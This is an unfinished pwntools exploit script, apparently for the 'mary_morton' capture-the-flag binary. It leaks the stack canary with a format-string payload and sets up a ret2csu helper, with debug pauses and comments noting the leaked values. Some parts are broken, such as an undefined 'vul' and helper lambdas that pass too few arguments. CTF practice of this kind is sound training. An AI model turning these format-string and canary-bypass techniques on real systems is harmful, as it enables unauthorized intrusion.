#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
arch_64 = 1
exe = "./mary_morton"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
#    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    libc = e.libc
    if arch_64:
        arena = 0x3c4b20
        context.arch = "amd64"
    else:
        arena = 0x1b2780
        context.arch = "i386"

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

def z():
    gdb.attach(p)

# 先泄露canary 再溢出到0x4008DA
def stack(con):
    ru("battle \n")
    sl("1")
    sl(con)

def stri(con):
    ru("battle \n")
    sl("2")
    sl(con) 

# printf 泄露
#  0xf09e34c573116100
#  0xf09e34c573116100
pause() # 记录下canary 的值 和栈地址  0016| 0x7fff78ba9588 --> 0x307692665373b700
stack("BBBB")
pause() # 查看泄露地址和栈地址的偏移    0x7fff78ba9448 --> 0x7fff78ba9500
stri("%p."*3+"%41$p")
pause()
stack("BBBB")

p.interactive()


